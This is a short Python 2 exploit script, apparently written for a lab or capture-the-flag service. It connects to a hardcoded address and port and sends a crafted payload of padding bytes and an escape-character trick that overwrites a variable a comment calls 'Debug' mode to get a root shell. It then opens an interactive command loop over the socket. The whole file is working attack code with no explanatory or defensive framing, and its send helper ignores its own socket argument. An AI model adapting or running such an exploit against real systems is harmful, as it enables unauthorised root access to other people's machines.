import struct 
import socket 
import codecs

def send(socket, packet):
    s.send(packet+"\n")

target_ip = "192.168.1.66"

s = socket.socket()
s.connect((target_ip, 1337))

x = raw_input("Exploit ?")

payload = "ABC"

payload += '\\' #NO
payload += "\xf8"*50
payload += "A"*12
target_var = "11111\x00" # "Debug" mode to get a root shell
payload += target_var
payload += '\\' #YES

payload += '\n'

print "Exploit : Sending payload..."

send(s, payload)

r = s.recv(1024)
print r
print "Exploit : Entering shell !"

while True:
    user_input = raw_input("> ")
    send(s, user_input)
    r = s.recv(1024)
    print r


